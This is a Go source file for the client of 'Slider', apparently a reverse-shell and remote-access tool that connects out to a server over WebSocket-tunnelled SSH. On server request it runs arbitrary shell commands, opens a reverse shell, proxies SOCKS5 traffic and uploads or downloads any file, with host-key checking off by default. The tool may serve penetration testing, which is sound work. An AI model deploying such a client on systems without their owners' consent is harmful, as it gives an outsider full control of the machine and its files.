package client

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"slices"
	"slider/pkg/interpreter"
	"slider/pkg/sconn"
	"slider/pkg/scrypt"
	"slider/pkg/sio"
	"slider/pkg/slog"
	"slider/pkg/ssocks"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

type client struct {
	*slog.Logger
	serverAddr        string
	keepalive         time.Duration
	wsConfig          *websocket.Dialer
	httpHeaders       http.Header
	sshConfig         *ssh.ClientConfig
	sshClientConn     ssh.Conn
	interpreter       *interpreter.Interpreter
	ptyFile           *os.File
	verbose           string
	disconnect        chan bool
	socksInstance     *ssocks.Instance
	serverFingerprint []string
}

const help = `
Slider Client

  Creates a new Slider Client instance and connects 
to the defined Slider Server.

Usage: ./slider client [flags] <[server_address]:port>

Flags:
`

func NewClient(args []string) {
	clientFlags := flag.NewFlagSet("client", flag.ContinueOnError)
	verbose := clientFlags.String("verbose", "info", "Adds verbosity [debug|info|warn|error]")
	keepAlive := clientFlags.Duration("keepalive", 60*time.Second, "Sets keepalive interval in seconds.")
	colorless := clientFlags.Bool("colorless", false, "Disables logging colors")
	fingerprint := clientFlags.String("fingerprint", "", "Server fingerprint for host verification")
	key := clientFlags.String("key", "", "Private key to use for authentication")
	clientFlags.Usage = func() {
		fmt.Printf(help)
		clientFlags.PrintDefaults()
		fmt.Println()
	}

	if fErr := clientFlags.Parse(args); fErr != nil {
		return
	}

	if slices.Contains(clientFlags.Args(), "help") || len(clientFlags.Args()) == 0 {
		clientFlags.Usage()
		return
	}
	// Set interpreter
	i, err := interpreter.NewInterpreter()
	if err != nil {
		panic(err)
	}

	log := slog.NewLogger("Client")
	if lvErr := log.SetLevel(*verbose); lvErr != nil {
		fmt.Printf("%s", lvErr)
		return
	}

	// It is safe to assume that if PTY is On then colors are supported.
	if i.PtyOn && !*colorless {
		log.WithColors()
	}

	c := client{
		Logger:      log,
		keepalive:   *keepAlive,
		disconnect:  make(chan bool, 1),
		interpreter: i,
	}

	c.serverAddr = clientFlags.Args()[0]

	c.wsConfig = &websocket.Dialer{
		NetDial:          nil,
		HandshakeTimeout: 60 * time.Second,
		Subprotocols:     nil,
		// Use Default Buffer Size
		ReadBufferSize:  0,
		WriteBufferSize: 0,
	}

	c.sshConfig = &ssh.ClientConfig{
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		ClientVersion:   "SSH-slider-client",
		Timeout:         60 * time.Second,
	}

	if *key != "" {
		if aErr := c.enableKeyAuth(*key); aErr != nil {
			c.Fatalf("%s", aErr)
		}
	}

	if *fingerprint != "" {
		if fErr := c.loadFingerPrint(*fingerprint); fErr != nil {
			c.Fatalf("%s", fErr)
		}
		c.sshConfig.HostKeyCallback = c.verifyServerKey
	}

	// Check the use of extra headers for added functionality
	// https://developer.mozilla.org/en-US/docs/Web/HTTP/Protocol_upgrade_mechanism
	c.httpHeaders = http.Header{}

	wsConn, _, err := c.wsConfig.DialContext(context.Background(), fmt.Sprintf("ws://%s", c.serverAddr), c.httpHeaders)
	if err != nil {
		c.Fatalf("Can't connect to Server address: %s", err)
		return
	}

	netConn := sconn.WsConnToNetConn(wsConn)

	var reqChan <-chan *ssh.Request
	var newChan <-chan ssh.NewChannel
	var connErr error

	c.sshClientConn, newChan, reqChan, connErr = ssh.NewClientConn(netConn, c.serverAddr, c.sshConfig)
	if connErr != nil {
		c.Fatalf("%s\n", connErr)
		return
	}
	defer func() { _ = c.sshClientConn.Close() }()
	c.Infof("Connected to server...")
	c.Debugf("Session %v\n", c.sshClientConn.SessionID())

	// Send Interpreter Information to Server
	go c.sendClientInfo(i)

	c.disconnect = make(chan bool, 1)
	if c.keepalive > 0 {
		go c.keepAlive(c.keepalive)
	}

	go c.handleGlobalChannels(newChan)
	go c.handleGlobalRequests(reqChan)

	<-c.disconnect
	close(c.disconnect)
}

func (c *client) enableKeyAuth(key string) error {
	// TODO: Probably not the best way to accomplish this
	p := fmt.Sprintf("-----BEGIN PRIVATE KEY-----\n%s\n-----END PRIVATE KEY-----", key)
	signer, pErr := ssh.ParsePrivateKey([]byte(p))
	if pErr != nil {
		return fmt.Errorf("failed to parse private key: %v", pErr)
	}
	c.sshConfig.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}

	return nil
}

func (c *client) loadFingerPrint(fp string) error {
	// Check is fingerprint flag is a file or a fingerprint string
	// A file should contain a list of valid fingerprints
	fileInfo, sErr := os.Stat(fp)
	if sErr != nil {
		c.serverFingerprint = append(c.serverFingerprint, fp)
		return nil
	}
	if fileInfo.IsDir() {
		return fmt.Errorf("fingerprint flag points to a directory not a file")
	}
	file, fErr := os.Open(fp)
	if fErr != nil {
		return fmt.Errorf("failed to read fingerprint file - %s", fErr)
	}
	scan := bufio.NewScanner(file)
	for scan.Scan() {
		if f := scan.Text(); f != "" {
			c.serverFingerprint = append(c.serverFingerprint, f)
		}
	}

	return nil
}

func (c *client) verifyServerKey(hostname string, remote net.Addr, key ssh.PublicKey) error {
	serverFingerprint, fErr := scrypt.GenerateFingerprint(key)
	if fErr != nil {
		return fErr
	}

	if slices.Contains(c.serverFingerprint, serverFingerprint) {
		c.Infof("Server successfully vefified with provided fingerprint")
		return nil
	}

	return fmt.Errorf("server %s - verification failed", remote.String())
}

func (c *client) sendClientInfo(i *interpreter.Interpreter) {
	interpreterBytes, _ := json.Marshal(i)
	ok, _, sErr := c.sshClientConn.SendRequest("interpreter", true, interpreterBytes)
	if sErr != nil || !ok {
		c.Errorf("client information was not sent to server - %v", sErr)
	}
}

func (c *client) handleGlobalChannels(newChan <-chan ssh.NewChannel) {
	for nc := range newChan {
		switch nc.ChannelType() {
		case "socks5":
			c.Debugf("Opening \"%s\" channel", nc.ChannelType())
			go c.handleSocksChannel(nc)
		case "file-upload":
			c.Debugf("Opening \"%s\" channel", nc.ChannelType())
			go c.handleFileUploadChannel(nc)
		case "file-download":
			c.Debugf("Opening \"%s\" channel", nc.ChannelType())
			go c.handleFileDownloadChannel(nc)
		default:
			c.Debugf("Rejected channel %s", nc.ChannelType())
			if rErr := nc.Reject(ssh.UnknownChannelType, ""); rErr != nil {
				c.Warnf("Received Unknown channel type \"%s\" - %s",
					nc.ChannelType(),
					rErr,
				)
			}
		}
	}
}

func (c *client) handleGlobalRequests(requests <-chan *ssh.Request) {
	for req := range requests {
		switch req.Type {
		case "keep-alive":
			if err := c.replyConnRequest(req, true, []byte("pong")); err != nil {
				c.Errorf("Error sending \"%s\" reply to Server - %v", req.Type, err)
			}
		case "session-exec":
			c.Debugf("Received \"%s\" Connection Request", req.Type)
			go c.sendCommandExec(req)
		case "session-shell":
			c.Debugf("Received \"%s\" Connection Request", req.Type)
			go c.sendReverseShell(req)
		case "window-change":
			// Server only sends this Request if Interpreter is PTY
			// after Reverse Shell is sent, ergo PTY File has been created
			c.Debugf("Server Requested window change: %s\n", req.Payload)
			var termSize interpreter.TermSize
			if err := json.Unmarshal(req.Payload, &termSize); err != nil {
				c.Fatalf("%s", err)
			}
			c.updatePtySize(termSize.Rows, termSize.Cols)
		case "checksum-verify":
			go c.verifyFileCheckSum(req)
		case "disconnect":
			c.Warnf("Server requested Client disconnection.")
			_ = c.replyConnRequest(req, true, []byte("disconnected"))
			c.disconnect <- true
		default:
			c.Debugf("Received unknown Connection Request Type: \"%s\"", req.Type)
			_ = req.Reply(false, nil)
		}
	}
}

func (c *client) sendCommandExec(request *ssh.Request) {
	channel, _, openErr := c.sshClientConn.OpenChannel("session", nil)
	if openErr != nil {
		c.Errorf("failed to open a \"session\" channel to server")
		return
	}
	defer func() { _ = channel.Close() }()

	rcvCmd := string(request.Payload)
	c.Debugf("Received - Bytes Payload: %v, Command: \"%s\"", request.Payload, rcvCmd)

	cmd := exec.Command(c.interpreter.Shell, append(c.interpreter.CmdArgs, rcvCmd)...) //nolint:gosec

	out, _ := cmd.CombinedOutput()
	_, cwErr := channel.Write(out)
	if cwErr != nil {
		c.Errorf("failed to write command \"%s\" output into channel", rcvCmd)
	}

	// Notify Server we are good to go
	if err := c.replyConnRequest(request, true, []byte("exec-ready")); err != nil {
		c.Errorf("failed to send reply to request \"%s\"", request.Type)
	}
}

func (c *client) keepAlive(keepalive time.Duration) {
	ticker := time.NewTicker(keepalive)
	defer ticker.Stop()

	for {
		select {
		case <-c.disconnect:
			c.Infof("Shutting down...")
			return
		case <-ticker.C:
			_, p, sendErr := c.sendConnRequest("keep-alive", true, []byte("ping"))
			if sendErr != nil || !bytes.Equal(p, []byte("pong")) {
				c.Errorf("KeepAlive Check Lost connection to Server.")
				c.disconnect <- true
			}
		}
	}
}

func (c *client) sendConnRequest(reqType string, wantReply bool, payload []byte) (bool, []byte, error) {
	c.Debugf("Sending Connection Request Type \"%s\" with Payload: \"%s\"", reqType, payload)
	return c.sshClientConn.SendRequest(reqType, wantReply, payload)
}

func (c *client) replyConnRequest(req *ssh.Request, reply bool, payload []byte) error {
	c.Debugf("Replying Connection Request Type \"%s\" with Payload: \"%s\"", req.Type, payload)
	return req.Reply(reply, payload)
}

func (c *client) sendSessionRequest(sshSession *ssh.Session, requestType string, ok bool, payload []byte) error {
	okR, err := sshSession.SendRequest(requestType, ok, payload)
	if err != nil {
		return fmt.Errorf("%s %v", requestType, err)
	}
	c.Debugf("Sent Session Request \"%s\", received: \"%v\" from server.\n", requestType, okR)
	return nil
}

func (c *client) handleSocksChannel(channel ssh.NewChannel) {
	socksChan, req, aErr := channel.Accept()
	if aErr != nil {
		c.Errorf(
			"Failed to accept \"%s\" channel\n%v",
			channel.ChannelType(),
			aErr,
		)
		return
	}
	defer func() { _ = socksChan.Close() }()
	go ssh.DiscardRequests(req)

	config := &ssocks.InstanceConfig{
		Logger:       c.Logger,
		IsServer:     true,
		SocksChannel: socksChan,
	}
	c.socksInstance = ssocks.New(config)

	if err := c.socksInstance.StartServer(); err != nil {
		c.Debugf("SOCKS - %s", err)
	}
}

func (c *client) handleFileUploadChannel(channel ssh.NewChannel) {
	uploadChan, requests, aErr := channel.Accept()
	if aErr != nil {
		c.Errorf(
			"Failed to accept \"%s\" channel\n%v",
			channel.ChannelType(),
			aErr,
		)
		return
	}
	defer func() { _ = uploadChan.Close() }()

	go ssh.DiscardRequests(requests)

	filePath := string(channel.ExtraData())

	file, fErr := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, 0644)
	defer func() { _ = file.Close() }()
	if fErr == nil {
		_, _ = io.Copy(file, uploadChan)
	}
}

func (c *client) verifyFileCheckSum(req *ssh.Request) {
	var fileInfo sio.FileInfo
	c.Debugf("Received \"%s\" Connection Request", req.Type)
	if err := json.Unmarshal(req.Payload, &fileInfo); err != nil {
		_ = req.Reply(false, []byte("failed to unmarshal file info"))
	}

	_, checkSum, cErr := sio.ReadFile(fileInfo.FileName)
	if cErr != nil {
		_ = req.Reply(false, []byte(fmt.Sprintf("could not read file %s", fileInfo.FileName)))
	}

	if checkSum != fileInfo.CheckSum {
		_ = req.Reply(false, []byte(fmt.Sprintf(
			"checksum of src (%s) differs from dst (%s)",
			fileInfo.CheckSum, checkSum)))
	}
	_ = req.Reply(true, nil)
}

func (c *client) handleFileDownloadChannel(channel ssh.NewChannel) {
	downloadChan, _, aErr := channel.Accept()
	if aErr != nil {
		c.Errorf(
			"Failed to accept \"%s\" channel\n%v",
			channel.ChannelType(),
			aErr,
		)
		return
	}
	defer func() { _ = downloadChan.Close() }()

	srcFile := string(channel.ExtraData())
	file, checkSum, fErr := sio.ReadFile(srcFile)
	if fErr != nil {
		// Rejecting the Reply will tell the server the payload is an error
		_, _ = downloadChan.SendRequest("checksum", false, []byte(fmt.Sprintf("%s", fErr)))
	}
	// If the File was read Successfully we will send its CheckSum as Payload
	_, _ = downloadChan.SendRequest("checksum", true, []byte(checkSum))
	// Copy file over channel
	_, _ = downloadChan.Write(file)
}
